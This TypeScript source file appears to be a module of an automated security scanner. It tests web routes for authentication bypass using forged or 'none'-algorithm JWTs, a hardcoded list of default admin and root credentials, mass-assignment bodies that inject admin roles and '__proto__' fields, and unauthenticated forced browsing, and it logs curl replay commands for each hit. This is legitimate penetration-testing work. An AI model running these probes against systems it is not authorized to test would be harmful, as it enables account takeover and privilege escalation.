/**
 * Authentication Bypass Agent — tests for auth/authorization bypass vulnerabilities.
 *
 * Strategies:
 *  1. JWT bypass        — none algorithm, expired, role-inflated tokens
 *  2. Default credentials — common admin/test credential pairs on login endpoints
 *  3. Mass assignment   — inject isAdmin/role fields in request body
 *  4. Forced browsing   — access protected resources without authentication
 *
 * All requests are deterministic — AI is NOT used here.
 */

import { httpRequest } from "../utils/httpClient";
import { AUTH_PAYLOADS } from "../utils/payloadGenerator";

export interface AuthBypassTask {
  id: string;
  route: string;
  method: string;
  strategy: "jwt-bypass" | "default-creds" | "mass-assignment" | "forced-browse";
}

export interface AuthFinding {
  route: string;
  strategy: string;
  description: string;
  evidence: string;
  severity: "critical" | "high" | "medium";
  checkType: string;
  curlReplay: string;
}

// Paths that are EXPECTED to be public (no auth required)
const PUBLIC_ROUTE_PATTERNS = [
  "login", "signin", "register", "signup", "health", "status",
  "docs", "public", "forgot-password", "reset-password",
];

function isPublicRoute(route: string): boolean {
  const r = route.toLowerCase();
  return PUBLIC_ROUTE_PATTERNS.some((p) => r.includes(p));
}

function isAuthRoute(route: string): boolean {
  const r = route.toLowerCase();
  return r.includes("login") || r.includes("signin") || r.includes("register") || r.includes("signup");
}

// ── Strategy 1: JWT bypass ────────────────────────────────────────────────────
async function testJwtBypass(baseUrl: string, route: string, method: string): Promise<AuthFinding[]> {
  const findings: AuthFinding[] = [];
  if (isPublicRoute(route)) return findings; // skip — public routes don't need auth

  const url = `${baseUrl}${route}`;

  for (const authPayload of AUTH_PAYLOADS.filter((a) => a.headers.Authorization)) {
    const headers: Record<string, string> = {
      "Content-Type": "application/json",
      ...authPayload.headers,
    };
    const res = await httpRequest(url, { method, headers, body: JSON.stringify({}), timeoutMs: 8_000 });

    // Protected route returned success with invalid/missing token = bypass
    if (res.status >= 200 && res.status < 300) {
      findings.push({
        route,
        strategy: "jwt-bypass",
        description: authPayload.description,
        evidence: `Protected route returned ${res.status} with: ${authPayload.description}`,
        severity: authPayload.description.includes("none algorithm") ? "critical" : "high",
        checkType: "auth-bypass-jwt",
        curlReplay: `curl -s -X ${method} "${url}" -H 'Authorization: ${authPayload.headers.Authorization ?? ""}' -H "Content-Type: application/json" -d '{}'`,
      });
    }
  }
  return findings;
}

// ── Strategy 2: Default credentials ──────────────────────────────────────────
async function testDefaultCredentials(baseUrl: string, route: string): Promise<AuthFinding[]> {
  const findings: AuthFinding[] = [];
  if (!isAuthRoute(route)) return findings; // only test on login/register endpoints

  const url = `${baseUrl}${route}`;
  const defaultCreds = [
    { email: "admin@admin.com", password: "admin" },
    { email: "admin@admin.com", password: "admin123" },
    { email: "admin@admin.com", password: "password" },
    { email: "admin", password: "admin" },
    { email: "root", password: "root" },
    { email: "test@test.com", password: "test" },
    { email: "user@user.com", password: "user" },
  ];

  for (const creds of defaultCreds) {
    const res = await httpRequest(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(creds),
      timeoutMs: 8_000,
    });

    const bodyLow = res.body.toLowerCase();
    const hasToken = bodyLow.includes("token") || bodyLow.includes("jwt") ||
                     bodyLow.includes("accesstoken") || bodyLow.includes("session");
    const hasCookie = res.setCookies.length > 0;

    if (res.status >= 200 && res.status < 300 && (hasToken || hasCookie)) {
      findings.push({
        route,
        strategy: "default-creds",
        description: `Default credentials accepted: ${creds.email} / ${creds.password}`,
        evidence: `Login returned ${res.status} with auth token/session — default credentials work`,
        severity: "critical",
        checkType: "default-credentials",
        curlReplay: `curl -s -X POST "${url}" -H "Content-Type: application/json" -d '${JSON.stringify(creds)}'`,
      });
      break; // One confirmed hit is sufficient
    }
  }
  return findings;
}

// ── Strategy 3: Mass assignment ───────────────────────────────────────────────
async function testMassAssignment(baseUrl: string, route: string, method: string): Promise<AuthFinding[]> {
  const findings: AuthFinding[] = [];
  const url = `${baseUrl}${route}`;

  const massAssignBodies = [
    { role: "admin", isAdmin: true, admin: 1 },
    { user: { role: "admin", isAdmin: true } },
    { __proto__: { isAdmin: true } },
    { userType: "superadmin", permissions: ["admin", "all"] },
    { access_level: 9999, is_superuser: true },
  ];

  for (const extraFields of massAssignBodies) {
    const body = { email: "normal@user.com", password: "normalpass123", ...extraFields };
    const res = await httpRequest(url, {
      method,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
      timeoutMs: 8_000,
    });

    const bodyLow = res.body.toLowerCase();
    if (res.status < 400 && (bodyLow.includes("admin") || bodyLow.includes("isadmin") || bodyLow.includes("role"))) {
      findings.push({
        route,
        strategy: "mass-assignment",
        description: `Mass assignment: ${JSON.stringify(extraFields)}`,
        evidence: `Response ${res.status} contains elevated privilege markers after injecting extra fields`,
        severity: "high",
        checkType: "mass-assignment",
        curlReplay: `curl -s -X ${method} "${url}" -H "Content-Type: application/json" -d '${JSON.stringify(body)}'`,
      });
    }
  }
  return findings;
}

// ── Strategy 4: Forced browsing ───────────────────────────────────────────────
async function testForcedBrowsing(baseUrl: string, route: string): Promise<AuthFinding[]> {
  const findings: AuthFinding[] = [];
  if (isPublicRoute(route)) return findings;

  const url = `${baseUrl}${route}`;
  const res = await httpRequest(url, { method: "GET", timeoutMs: 8_000 });

  if (res.status >= 200 && res.status < 300) {
    const bodyLow = res.body.toLowerCase();
    const appearsProtected = bodyLow.includes("unauthorized") || bodyLow.includes("forbidden") ||
                             bodyLow.includes("login") || bodyLow.includes("sign in");
    if (!appearsProtected) {
      findings.push({
        route,
        strategy: "forced-browse",
        description: "Unauthenticated access to protected resource",
        evidence: `Route returned ${res.status} without any authentication credentials`,
        severity: "high",
        checkType: "forced-browsing",
        curlReplay: `curl -s "${url}"`,
      });
    }
  }
  return findings;
}

/** Create auth bypass task definitions for a list of routes. */
export function createAuthTasks(routes: Array<{ path: string; methods: string[] }>): AuthBypassTask[] {
  return routes.map((route) => ({
    id: `auth-${route.path.replace(/\//g, "-")}`,
    route: route.path,
    method: route.methods.includes("POST") ? "POST" : "GET",
    strategy: isAuthRoute(route.path) ? "default-creds" : "forced-browse",
  }));
}

/** Execute all auth bypass tests against a single route. */
export async function runAuthBypass(
  baseUrl: string,
  route: { path: string; methods: string[] }
): Promise<AuthFinding[]> {
  const method = route.methods.includes("POST") ? "POST" : "GET";
  const [jwtFindings, credFindings, massFindings, browseFindings] = await Promise.all([
    testJwtBypass(baseUrl, route.path, method),
    testDefaultCredentials(baseUrl, route.path),
    testMassAssignment(baseUrl, route.path, method),
    testForcedBrowsing(baseUrl, route.path),
  ]);
  return [...jwtFindings, ...credFindings, ...massFindings, ...browseFindings];
}
